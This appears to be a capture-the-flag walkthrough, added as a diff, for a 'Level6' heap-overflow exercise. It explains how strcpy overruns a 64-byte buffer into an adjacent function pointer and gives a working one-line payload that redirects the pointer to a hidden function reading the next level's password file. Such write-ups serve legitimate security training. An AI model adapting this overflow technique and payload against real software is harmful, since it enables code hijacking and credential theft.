@@ -1,0 +1,112 @@
+================================== Level6 Walkthrough ============================================
+
+Vulnerability
+
+The program allocates two adjacent heap chunks:
+
+buf = malloc(64);
+fp  = malloc(4);
+
+Then initializes the function pointer:
+
+*fp = m;
+
+and copies user input into the heap buffer using:
+
+strcpy(buf, argv[1]);
+
+The problem is that strcpy() performs no bounds checking.
+
+This creates a heap overflow vulnerability.
+
+Important Memory Layout
+
+Conceptually the heap looks like this:
+
+=============================================
+[8 bytes metadata][64-byte buffer]
+[8 bytes metadata][4-byte function pointer]
+=============================================
+
+The first metadata chunk is irrelevant because writing starts directly inside the buffer.
+
+The important part is:
+
+buffer → next chunk metadata → function pointer
+
+So if we write more than 64 bytes, we continue into:
+
+heap metadata
+then into the function pointer allocation
+Why 72 Bytes?
+
+To reach the function pointer:
+
+64 bytes buffer
++ 8 bytes heap metadata
+= 72 bytes
+
+After 72 bytes, we fully control the function pointer stored in heap memory.
+
+Function Pointer Hijack
+
+Normally:
+
+fp → m()
+
+and later the program executes:
+
+(*fp)();
+
+which becomes:
+
+m();
+
+resulting in:
+
+Nope
+Hidden Function
+
+Using:
+
+info functions
+
+reveals another function:
+
+0x08048454  n
+
+Disassembling it shows:
+
+system("/bin/cat /home/user/level7/.pass");
+
+So the goal is simply:
+
+replace m() address with n() address
+Exploit
+
+Address of n():
+
+0x08048454
+
+Little-endian:
+
+\x54\x84\x04\x08
+
+Final payload:
+
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+What Happens in Memory
+
+Before overflow:
+
+[fp] = 0x08048468 → m()
+
+After overflow:
+
+[fp] = 0x08048454 → n()
+
+Then:
+
+(*fp)();
+
+calls n() instead of m().
